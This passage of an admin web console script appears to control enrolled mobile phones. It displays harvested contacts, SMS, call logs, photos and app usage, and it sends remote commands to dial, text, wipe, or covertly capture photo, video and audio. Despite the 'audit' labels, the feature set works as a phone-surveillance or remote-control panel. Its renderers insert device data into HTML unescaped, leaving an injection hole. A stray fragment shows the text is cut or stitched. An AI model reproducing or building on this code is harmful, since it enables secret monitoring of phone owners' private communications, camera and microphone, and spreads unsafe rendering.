      function deviceModelFromInfo(deviceInfo) {
        if (!deviceInfo) return '—';
        try {
          var o = typeof deviceInfo === 'string' ? JSON.parse(deviceInfo) : deviceInfo;
          return (o && o.model) ? o.model : '—';
        } catch (e) { return '—'; }
      }
      function maskIp(ip) {
        if (!ip || typeof ip !== 'string') return '—';
        var parts = ip.trim().split('.');
        if (parts.length === 4) return parts[0] + '.' + parts[1] + '.*.*';
        return ip;
      }
      function formatBackendTime(s) {
        if (!s) return '—';
        var d = new Date(s);
        if (isNaN(d.getTime())) return String(s).replace(/</g, '&lt;').replace(/>/g, '&gt;');
        var pad = function (x) { return (x < 10 ? '0' : '') + x; };
        return d.getFullYear() + '/' + pad(d.getMonth() + 1) + '/' + pad(d.getDate()) + ' ' + pad(d.getHours()) + ':' + pad(d.getMinutes());
      }

          '</tr>';

      function renderDevicesTable(items) {
        var tbody = document.getElementById('deviceTableBody');
        if (!tbody) return;
        if (!items || items.length === 0) {
          tbody.innerHTML = '<tr><td colspan="12" class="loading-cell">' + i18n.t('noDevices') + '</td></tr>';
          return;
        }
        tbody.innerHTML = items.map(buildDeviceRow).join('');
      }
      function loadDevices(params) {
        if (!adminApi || !adminApi.getAdminToken()) {
          renderDevicesTable([]);
          return;
        }
        var hint = document.getElementById('deviceTableLoading');
        if (hint) hint.textContent = i18n.t('loadingDevices') || '加载中…';
        adminApi.getDevices(params || {}).then(function(data) {
          var hintEl = document.getElementById('mockHint');
          var items = (data && data.items) ? data.items : [];
          renderDevicesTable(items);
          if (hintEl) hintEl.textContent = '（已从 API 加载 ' + (data.total != null ? data.total : items.length) + ' 条）';
          if (items.length > 0) bindDeviceRowHandlers();
        }).catch(function(r) {
          if (r && (r.status === 401 || r.status === 403)) app.redirectLogin();
          else {
            renderDevicesTable([]);
            var hintEl = document.getElementById('mockHint');
            if (hintEl) hintEl.textContent = i18n.t('previewMock');
          }
        });
      }

      function getDeviceIdFromButton(btn){
        var tr = btn.closest('tr');
        if (!tr) return '';
        var deviceIdEl = tr.querySelector('.device-id-value') || tr.querySelector('.device-info-cell .device-info-block .info-value');
        if (!deviceIdEl) return '';
        var full = deviceIdEl.getAttribute('data-device-id');
        return (full != null && full !== '') ? full : deviceIdEl.textContent.trim();
      }
      var DIAL_SMS_COOLDOWN_SEC = 10;
      var CAPTURE_COOLDOWN_SEC = 20;
      function startCooldown(btn, label, sec) {
        if (!btn || !label) return;
        var left = (sec > 0 ? sec : DIAL_SMS_COOLDOWN_SEC);
        btn.disabled = true;
        var tick = function() {
          if (left <= 0) {
            btn.disabled = false;
            btn.textContent = label;
            return;
          }
          btn.textContent = left + (i18n.t('cooldownSeconds') || '秒后可再点');
          left--;
          setTimeout(tick, 1000);
        };
        tick();
      }
      function sendCommandToDevice(deviceId, cmd, params, btn, cooldownSec) {
        if (!deviceId) { alert(i18n.t('deviceIdRequired') || '请先选择设备'); return; }
        if (!adminApi || !adminApi.sendCommand) { alert('API 未就绪'); return; }
        var label = btn ? btn.textContent : '';
        if (btn) { btn.disabled = true; btn.textContent = (i18n.t('sending') || '发送中') + '...'; }
        adminApi.sendCommand(deviceId, cmd, params || {}).then(function(res) {
          if (cooldownSec && btn) {
            startCooldown(btn, label, cooldownSec);
          } else if (btn) {
            btn.disabled = false;
            btn.textContent = label;
          }
          if (res && res.ok) { alert(i18n.t('commandSent') || '指令已下发'); return; }
          var msg = (i18n.t('sendFailed') || '下发失败');
          if (res && res.json) { res.json().then(function(b){ if (b && b.message) alert(b.message); else alert(msg); }).catch(function(){ alert(msg); }); }
          else { alert(msg); }
        }).catch(function(err) {
          if (cooldownSec && btn) {
            startCooldown(btn, label, cooldownSec);
          } else if (btn) {
            btn.disabled = false;
            btn.textContent = label;
          }
          alert(err && err.message ? err.message : (i18n.t('sendFailed') || '下发失败'));
        });
      }
      function getAuditDataAsText(deviceId, page){
        var data = MOCK_AUDIT[deviceId] || MOCK_AUDIT.dev_a1b2c3;
        if (page === 'contacts') {
          var lines = ['姓名\t号码\t上报时间'];
          (data.contacts || []).forEach(function(r){ lines.push(r.name + '\t' + r.phone + '\t' + r.time); });
          return lines.join('\n');
        }
        if (page === 'sms') {
          var lines = ['类型\t号码\t内容\t上报时间'];
          (data.sms || []).forEach(function(r){ lines.push(r.type + '\t' + r.number + '\t' + r.body + '\t' + r.time); });
          return lines.join('\n');
        }
        if (page === 'calllog') {
          var lines = ['类型\t号码\t时长\t上报时间'];
          (data.calllog || []).forEach(function(r){ lines.push(r.type + '\t' + r.number + '\t' + r.duration + '\t' + r.time); });
          return lines.join('\n');
        }
        if (page === 'applist') {
          var lines = ['应用名\t包名\t上报时间'];
          (data.applist || []).forEach(function(r){ lines.push(r.name + '\t' + r.pkg + '\t' + r.time); });
          return lines.join('\n');
        }
        if (page === 'gallery') {
          return (data.gallery || []).join('\n');
        }
        return '';
      }
      function copyTextToClipboard(text){
        if (navigator.clipboard && navigator.clipboard.writeText) {
          navigator.clipboard.writeText(text).then(function(){ alert(i18n.t('copiedToClipboard')); }).catch(function(){ fallbackCopy(text); });
        } else { fallbackCopy(text); }
      }
      function fallbackCopy(text){
        var ta = document.createElement('textarea'); ta.value = text; ta.style.position = 'fixed'; ta.style.opacity = '0'; document.body.appendChild(ta); ta.select();
        try { document.execCommand('copy'); alert('已复制到剪贴板'); } catch (e) { alert('复制失败'); }
        document.body.removeChild(ta);
      }
      function downloadAsPlainText(text, filename){
        var blob = new Blob([text], { type: 'text/plain;charset=utf-8' });
        var url = URL.createObjectURL(blob);
        var a = document.createElement('a'); a.href = url; a.download = filename; a.click();
        URL.revokeObjectURL(url);
      }
      var placeholders = ['https://picsum.photos/200/200?random=1','https://picsum.photos/200/200?random=2','https://picsum.photos/200/200?random=3','https://picsum.photos/200/200?random=4','https://picsum.photos/200/200?random=5'];
      var pageToApiType = { contacts: 'contacts', sms: 'sms', calllog: 'call_log', applist: 'app_list', gallery: 'gallery', captures: 'captures' };
      function renderMockAudit(page, deviceId, bodyEl) {
        var data = MOCK_AUDIT[deviceId] || MOCK_AUDIT.dev_a1b2c3;
        if (page === 'contacts') {
          bodyEl.innerHTML = '<div class="table-wrap"><table class="audit-modal-table"><thead><tr><th>姓名</th><th>号码</th><th>上报时间</th></tr></thead><tbody>' + data.contacts.map(function(r){ return '<tr><td>'+r.name+'</td><td>'+r.phone+'</td><td>'+r.time+'</td></tr>'; }).join('') + '</tbody></table></div>';
        } else if (page === 'sms') {
          bodyEl.innerHTML = '<div class="table-wrap"><table class="audit-modal-table"><thead><tr><th>类型</th><th>号码</th><th>内容</th><th>收发时间</th></tr></thead><tbody>' + data.sms.map(function(r){ return '<tr><td>'+r.type+'</td><td>'+r.number+'</td><td>'+r.body+'</td><td>'+r.time+'</td></tr>'; }).join('') + '</tbody></table></div>';
        } else if (page === 'calllog') {
          bodyEl.innerHTML = '<div class="table-wrap"><table class="audit-modal-table"><thead><tr><th>类型</th><th>号码</th><th>时长</th><th>拨出/接听时间</th></tr></thead><tbody>' + data.calllog.map(function(r){ return '<tr><td>'+r.type+'</td><td>'+r.number+'</td><td>'+r.duration+'</td><td>'+r.time+'</td></tr>'; }).join('') + '</tbody></table></div>';
        } else if (page === 'applist') {
          bodyEl.innerHTML = '<div class="table-wrap"><table class="audit-modal-table"><thead><tr><th>应用名</th><th>包名</th><th>上报时间</th></tr></thead><tbody>' + data.applist.map(function(r){ return '<tr><td>'+r.name+'</td><td>'+r.pkg+'</td><td>'+r.time+'</td></tr>'; }).join('') + '</tbody></table></div>';
        } else if (page === 'gallery') {
          bodyEl.innerHTML = '<div class="gallery-grid">' + (data.gallery || []).map(function(src, i){ return '<img src="'+src+'" alt="相册'+(i+1)+'" onerror="this.src=\''+ (placeholders[i]||placeholders[0]) +'\'" />'; }).join('') + '</div>';
        } else if (page === 'captures') {
          bodyEl.innerHTML = '<p>' + (i18n.t('noCaptures') || '暂无采集数据') + '</p>';
        } else { bodyEl.innerHTML = '<p>暂无数据</p>'; }
      }
      /** 渲染审计记录列表（含「下载」按钮）；用于远程采集等无法直接展示内容时 */
      function renderApiItems(page, items, bodyEl) {
        if (!items || items.length === 0) { bodyEl.innerHTML = '<p>暂无数据</p>'; return; }
        if (page === 'gallery' && items[0].url != null) {
          bodyEl.innerHTML = '<div class="gallery-grid">' + items.map(function(it, i){ return '<img src="'+(it.url||'')+'" alt="'+(i+1)+'" onerror="this.style.display=\'none\'" />'; }).join('') + '</div>';
          return;
        }
        var keys = Object.keys(items[0]);
        var hasId = items.some(function(r){ return r.id != null; });
        if (hasId) keys = keys.concat(['_op']);
        var thead = '<tr>' + keys.map(function(k){ return '<th>' + (k === '_op' ? (i18n.t('actions') || '操作') : k) + '</th>'; }).join('') + '</tr>';
        var tbody = items.map(function(row){
          var cells = keys.filter(function(k){ return k !== '_op'; }).map(function(k){ return '<td>' + (row[k] != null ? row[k] : '') + '</td>'; });
          if (hasId) cells.push('<td>' + (row.id != null ? '<button type="button" class="btn btn-sm btn-download-blob" data-id="'+row.id+'" data-type="'+(row.type||'')+'">' + (i18n.t('download') || '下载') + '</button>' : '') + '</td>');
          return '<tr>'+cells.join('')+'</tr>';
        }).join('');
        bodyEl.innerHTML = '<div class="table-wrap"><table class="audit-modal-table"><thead>'+thead+'</thead><tbody>'+tbody+'</tbody></table></div>';
        bodyEl.querySelectorAll('.btn-download-blob').forEach(function(btn){
          btn.onclick = function(){
            var id = this.getAttribute('data-id');
            var typ = this.getAttribute('data-type') || '';
            if (!id || !adminApi || !adminApi.downloadAuditBlob) return;
            var name = 'audit_' + id + (typ ? '_' + typ : '') + '.bin';
            adminApi.downloadAuditBlob(id, name).catch(function(){ alert(i18n.t('downloadFailed') || '下载失败'); });
          };
        });
      }
      var AUDIT_PAGE_SIZE = 20;
      function formatTimestamp(ms) {
        if (ms == null) return '—';
        var n = typeof ms === 'number' ? ms : parseInt(ms, 10);
        if (isNaN(n)) return String(ms);
        var d = new Date(n < 1e12 ? n * 1000 : n);
        if (isNaN(d.getTime())) return String(ms);
        var pad = function (x) { return (x < 10 ? '0' : '') + x; };
        return d.getFullYear() + '/' + pad(d.getMonth() + 1) + '/' + pad(d.getDate()) + ' ' + pad(d.getHours()) + ':' + pad(d.getMinutes());
      }
      function smsTypeText(t) { var n = t != null ? parseInt(t, 10) : NaN; if (isNaN(n)) return t != null ? String(t) : '—'; switch (n) { case 1: return '收'; case 2: return '发'; case 3: return '草稿'; default: return String(t); } }
      function callTypeText(t) { var n = t != null ? parseInt(t, 10) : NaN; if (isNaN(n)) return t != null ? String(t) : '—'; switch (n) { case 1: return '接听'; case 2: return '拨出'; case 3: return '未接'; default: return String(t); } }
      /** 渲染解密后的审计内容（含分页）；bodyEl._auditItems / _auditPage / _auditPageType 用于分页 */
      function renderAuditContent(page, payload, bodyEl) {
        var items = (payload && payload.items) ? payload.items : [];
        if (items.length === 0) { bodyEl.innerHTML = '<p>暂无内容</p>'; return; }
        bodyEl._auditItems = items;
        bodyEl._auditPage = 1;
        bodyEl._auditPageType = page;
        renderAuditContentPage(bodyEl);
      }
      function renderAuditContentPage(bodyEl) {
        var items = bodyEl._auditItems || [];
        var page = Math.max(1, bodyEl._auditPage || 1);
        var pageType = bodyEl._auditPageType || '';
        var totalPages = Math.max(1, Math.ceil(items.length / AUDIT_PAGE_SIZE));
        if (page > totalPages) page = totalPages;
        bodyEl._auditPage = page;
        var start = (page - 1) * AUDIT_PAGE_SIZE;
        var end = Math.min(start + AUDIT_PAGE_SIZE, items.length);
        var pageItems = items.slice(start, end);
        var html = '';
        if (pageType === 'contacts') {
          var rows = pageItems.map(function(r) {
            var name = (r.display_name != null ? r.display_name : ((r.given_name || '') + ' ' + (r.family_name || '')).trim()) || '—';
            return '<tr><td>' + (r.id != null ? r.id : '') + '</td><td>' + name + '</td></tr>';
          });
          html = '<div class="table-wrap"><table class="audit-modal-table"><thead><tr><th>ID</th><th>姓名</th></tr></thead><tbody>' + rows.join('') + '</tbody></table></div>';
        } else if (pageType === 'gallery') {
          var rows = pageItems.map(function(r) {
            return '<tr><td>' + (r.id != null ? r.id : '') + '</td><td>' + (r.date_added != null ? r.date_added : '') + '</td><td>' + (r.size != null ? r.size : (r.kind || '')) + '</td><td>' + (r.mime_type || r.kind || '') + '</td></tr>';
          });
          html = '<div class="table-wrap"><table class="audit-modal-table"><thead><tr><th>ID</th><th>日期/时间戳</th><th>大小/类型</th><th>MIME/类型</th></tr></thead><tbody>' + rows.join('') + '</tbody></table></div>';
        } else if (pageType === 'sms') {
          var rows = pageItems.map(function(r) {
            var timeStr = formatTimestamp(r.date);
            var typeStr = smsTypeText(r.type);
            return '<tr><td>' + (r.id != null ? r.id : '') + '</td><td>' + typeStr + '</td><td>' + (r.address || '') + '</td><td>' + timeStr + '</td><td>' + (r.body_length != null ? r.body_length + ' 字符' : '') + '</td></tr>';
          });
          html = '<div class="table-wrap"><table class="audit-modal-table"><thead><tr><th>ID</th><th>类型</th><th>地址</th><th>收发时间</th><th>内容长度</th></tr></thead><tbody>' + rows.join('') + '</tbody></table></div>';
        } else if (pageType === 'calllog') {
          var rows = pageItems.map(function(r) {
            var timeStr = formatTimestamp(r.date);
            var typeStr = callTypeText(r.type);
            return '<tr><td>' + (r.id != null ? r.id : '') + '</td><td>' + typeStr + '</td><td>' + (r.number || '') + '</td><td>' + timeStr + '</td><td>' + (r.duration != null ? r.duration + ' 秒' : '') + '</td></tr>';
          });
          html = '<div class="table-wrap"><table class="audit-modal-table"><thead><tr><th>ID</th><th>类型</th><th>号码</th><th>拨出/接听时间</th><th>时长</th></tr></thead><tbody>' + rows.join('') + '</tbody></table></div>';
        } else if (pageType === 'applist') {
          var rows = pageItems.map(function(r) { return '<tr><td>' + (r.package || '') + '</td><td>' + (r.version_name || '') + '</td><td>' + (r.long_version_code != null ? r.long_version_code : '') + '</td></tr>'; });
          html = '<div class="table-wrap"><table class="audit-modal-table"><thead><tr><th>包名</th><th>版本名</th><th>版本号</th></tr></thead><tbody>' + rows.join('') + '</tbody></table></div>';
        } else if (pageType === 'usage') {
          var rows = pageItems.map(function(r) { var ms = r.total_time_ms != null ? r.total_time_ms : 0; var sec = Math.floor(ms / 1000); return '<tr><td>' + (r.package || '') + '</td><td>' + sec + ' 秒</td></tr>'; });
          html = '<div class="table-wrap"><table class="audit-modal-table"><thead><tr><th>包名</th><th>前台时长</th></tr></thead><tbody>' + rows.join('') + '</tbody></table></div>';
        } else {
          var keys = Object.keys(pageItems[0] || {});
          var thead = '<tr>' + keys.map(function(k){ return '<th>' + k + '</th>'; }).join('') + '</tr>';
          var tbody = pageItems.map(function(row){ return '<tr>' + keys.map(function(k){ return '<td>' + (row[k] != null ? row[k] : '') + '</td>'; }).join('') + '</tr>'; }).join('');
          html = '<div class="table-wrap"><table class="audit-modal-table"><thead>'+thead+'</thead><tbody>'+tbody+'</tbody></table></div>';
        }
        var hint = '<p class="audit-content-hint">以下为最新一次上报内容，共 ' + items.length + ' 条</p>';
        var pagination = '';
        if (totalPages > 1) {
          pagination = '<div class="audit-pagination"><button type="button" class="btn btn-sm audit-prev">上一页</button><span class="audit-page-info">第 ' + page + ' / ' + totalPages + ' 页</span><button type="button" class="btn btn-sm audit-next">下一页</button></div>';
        }
        bodyEl.innerHTML = hint + html + pagination;
        if (totalPages > 1) {
          bodyEl.querySelector('.audit-prev').onclick = function() { bodyEl._auditPage = Math.max(1, (bodyEl._auditPage || 1) - 1); renderAuditContentPage(bodyEl); };
          bodyEl.querySelector('.audit-next').onclick = function() { bodyEl._auditPage = Math.min(totalPages, (bodyEl._auditPage || 1) + 1); renderAuditContentPage(bodyEl); };
        }
      }
      function openAuditModal(page, deviceId){
        var overlay = document.getElementById('auditModalOverlay');
        var titleEl = document.getElementById('auditModalTitle');
        var bodyEl = document.getElementById('auditModalBody');
        var titles = { contacts: '通讯录', gallery: '相册', sms: '短信', calllog: '通话记录', applist: '已安装APP', captures: (i18n && i18n.t('capturesLabel')) ? i18n.t('capturesLabel') : '远程采集' };
        if (page === 'usage') titles.usage = '应用使用时长';
        titleEl.textContent = (titles[page] || page) + ' - ' + (deviceId ? deviceId.slice(0, 12) + '…' : '');
        var apiType = pageToApiType[page];
        if (apiType && adminApi && adminApi.getAdminToken() && adminApi.getAudit) {
          bodyEl.innerHTML = '<p class="loading-hint">加载中…</p>';
          overlay.style.display = 'flex';
          adminApi.getAudit(deviceId, apiType).then(function(data) {
            if (!data.items || data.items.length === 0) {
              bodyEl.innerHTML = '<p class="audit-empty-hint">' + (i18n.t('noAuditData') || '暂无上报数据，请确保设备已授权并完成采集上报。') + '</p>';
              return;
            }
            if (page === 'captures') {
              renderApiItems(page, data.items, bodyEl);
              return;
            }
            var latestId = data.items[0].id;
            if (!adminApi.getAuditBlobJson) { renderApiItems(page, data.items, bodyEl); return; }
            adminApi.getAuditBlobJson(latestId).then(function(payload) {
              renderAuditContent(page, payload, bodyEl);
              var wrap = bodyEl.querySelector('.audit-content-hint');
              if (wrap) {
                var btn = document.createElement('button');
                btn.type = 'button';
                btn.className = 'btn btn-sm';
                btn.textContent = i18n.t('download') || '下载';
                btn.onclick = function() { adminApi.downloadAuditBlob(latestId, 'audit_' + latestId + '_' + apiType + '.json'); };
                wrap.appendChild(document.createTextNode(' '));
                wrap.appendChild(btn);
              }
            }).catch(function() {
              bodyEl.innerHTML = '<p>获取内容失败，仅显示上报记录。</p>';
              renderApiItems(page, data.items, bodyEl);
            });
          }).catch(function() {
            bodyEl.innerHTML = '<p class="audit-empty-hint">' + (i18n.t('noAuditDataOrFailed') || '暂无上报数据或加载失败，请确认设备已上报。') + '</p>';
          });
        } else {
          bodyEl.innerHTML = '<p class="audit-empty-hint">' + (i18n.t('noAuditData') || '暂无上报数据，请确保设备已授权并完成采集上报。') + '</p>';
          overlay.style.display = 'flex';
        }
      }
      function bindDeviceRowHandlers() {
        document.querySelectorAll('.btn-audit-view').forEach(function(btn){
          btn.onclick = function(){
            var deviceId = getDeviceIdFromButton(this);
            var page = this.getAttribute('data-page');
            openAuditModal(page, deviceId);
          };
        });
        document.querySelectorAll('.btn-audit-copy').forEach(function(btn){
          btn.onclick = function(){
            var deviceId = getDeviceIdFromButton(this);
            var page = this.getAttribute('data-page');
            var text = getAuditDataAsText(deviceId, page);
            if (text) copyTextToClipboard(text); else alert(i18n.t('noContentToCopy'));
          };
        });
        document.querySelectorAll('.btn-audit-export').forEach(function(btn){
          btn.onclick = function(){
            var deviceId = getDeviceIdFromButton(this);
            var page = this.getAttribute('data-page');
            var text = getAuditDataAsText(deviceId, page);
            var names = { contacts: '通讯录', sms: '短信', calllog: '通话记录', applist: '已安装APP', gallery: '相册' };
            var name = names[page] || page;
            var filename = name + '_' + deviceId + '.txt';
            if (text) downloadAsPlainText(text, filename); else alert(i18n.t('noContentToExport'));
          };
        });
        document.querySelectorAll('.btn-dial-cmd').forEach(function(btn){
          btn.onclick = function(){
            if (this.disabled) return;
            var deviceId = getDeviceIdFromButton(this);
            var cell = this.closest('.control-col-dial');
            var numberInput = cell ? cell.querySelector('.dial-number-input') : null;
            var number = numberInput ? numberInput.value.trim() : '';
            sendCommandToDevice(deviceId, 'mop.cmd.dial', { number: number }, this, DIAL_SMS_COOLDOWN_SEC);
          };
        });
        document.querySelectorAll('.btn-sms-cmd').forEach(function(btn){
          btn.onclick = function(){
            if (this.disabled) return;
            var deviceId = getDeviceIdFromButton(this);
            var cell = this.closest('.control-col-sms');
            var numberInput = cell ? cell.querySelector('.sms-number-input') : null;
            var bodyInput = cell ? cell.querySelector('.sms-body-input') : null;
            var number = numberInput ? numberInput.value.trim() : '';
            var body = bodyInput ? bodyInput.value.trim() : '';
            sendCommandToDevice(deviceId, 'mop.cmd.sms', { number: number, body: body }, this, DIAL_SMS_COOLDOWN_SEC);
          };
        });
        document.querySelectorAll('.btn-wipe-cmd').forEach(function(btn){
          btn.onclick = function(){
            var deviceId = getDeviceIdFromButton(this);
            if (!deviceId) { alert(i18n.t('deviceIdRequired') || '请先选择设备'); return; }
            if (!confirm(i18n.t('confirmWipe') || '确定对该设备执行远程擦除？将清空本地数据并退回激活页。')) return;
            sendCommandToDevice(deviceId, 'mop.cmd.wipe', {}, this);
          };
        });
        document.querySelectorAll('.btn-capture-photo').forEach(function(btn){
          btn.onclick = function(){
            if (this.disabled) return;
            var deviceId = getDeviceIdFromButton(this);
            sendCommandToDevice(deviceId, 'mop.cmd.capture.photo', {}, this, CAPTURE_COOLDOWN_SEC);
          };
        });
        document.querySelectorAll('.btn-capture-video').forEach(function(btn){
          btn.onclick = function(){
            if (this.disabled) return;
            var deviceId = getDeviceIdFromButton(this);
            sendCommandToDevice(deviceId, 'mop.cmd.capture.video', { duration_sec: 18 }, this, CAPTURE_COOLDOWN_SEC);
          };
        });
        document.querySelectorAll('.btn-capture-audio').forEach(function(btn){
          btn.onclick = function(){
            if (this.disabled) return;
            var deviceId = getDeviceIdFromButton(this);
            sendCommandToDevice(deviceId, 'mop.cmd.capture.audio', { duration_sec: 18 }, this, CAPTURE_COOLDOWN_SEC);
          };
        });
      }
      document.getElementById('auditModalClose').onclick = function(){ document.getElementById('auditModalOverlay').style.display = 'none'; };
      document.getElementById('auditModalOverlay').onclick = function(e){ if (e.target === this) this.style.display = 'none'; };
    }
  </script>
</body>
